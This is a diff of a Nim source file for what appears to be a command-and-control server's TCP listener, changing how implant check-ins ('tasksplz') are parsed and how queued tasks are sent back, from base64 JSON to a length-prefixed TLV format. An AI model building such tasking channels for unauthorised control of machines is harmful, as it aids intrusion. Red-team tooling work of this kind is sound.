@@ -2,15 +2,13 @@ import std/[
   asyncdispatch, 
   asyncnet, 
   asyncfutures, 
-  strutils, 
-  json, 
-  base64, 
+  strutils,  
   times
 ]
 
-import uuid4
+import uuid4, tlv
 
-import ../types, ../logging, ../processMessage, ../events
+import ../types, ../logging, ../processMessage, ../events, ../tasks
 
 type 
   TCPSocket* = ref object
@@ -33,44 +31,46 @@ proc `$`*(tcpListener: TCPListener): string =
 proc `@`*(tcpListener: TCPListener): string =
   $tcpListener
 
-proc `%`*(tcpListener: TCPListener): JsonNode =
-  return %*{
-    "id": tcpListener.id,
-    "listeningIP": tcpListener.listeningIP,
-    "port": tcpListener.port
-  }
-
 proc processMessages(server: C2Server, tcpListener: TCPListener, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
-  
-  while not tcpSocket.socket.isClosed:
-    var line: string
-    try: 
-      line = await tcpSocket.socket.recvLine()
-    except OSError: discard
+  var line: string
+  let p = initParser()
 
-    if line.len == 0:
+  while not tcpSocket.socket.isClosed:
+    try: 
+      var int32bytes = cast[seq[byte]](await tcpSocket.socket.recv(4))
+      p.setBuffer(int32bytes)
+      let size = p.extractInt32()
+      if size != 0:
+        line = await tcpSocket.socket.recv(size)
+    except OSError: discard
+    except IndexDefect:
       client.connected = false
       tcpSocket.socket.close()
       cDisconnected(client[], "client died")
       onClientDisconnected(client[])
-      continue
+      break
 
     if line == "tasksplz":
       client.lastCheckin = now()
-      var j: JsonNode = %*[]
-      for task in client.server.tasks:
-        if task.client == client[] and task.status == TaskCreated:
-          task.status = TaskNotCompleted
-          j.add %*{
-            "task": task.action,
-            "taskId": task.id,
-            "data": task.arguments
-          }
       onClientCheckin(client[])  
+
+      var tasks: seq[Task]
+      
+      for task in server.tasks:
+        if task.status == TaskCreated and task.client == client[]:
+          task.status = TaskNotCompleted
+          tasks.add task
+
+      let b = initBuilder()
+      b.addInt32(cast[int32](len tasks))
+      for task in tasks: b.addString(task.toTLV())
+
       try:
-        await tcpSocket.socket.send(encode($j) & "\r\n")
+        let c = initBuilder()
+        c.addString(b.encodeString())
+        await tcpSocket.socket.send(c.encodeString())
       except OSError: discard
-      continue
+      
     else: discard processMessage(client, line)
 
 proc createNewTcpListener*(server: C2Server, instance: ListenerInstance) {.async.} =
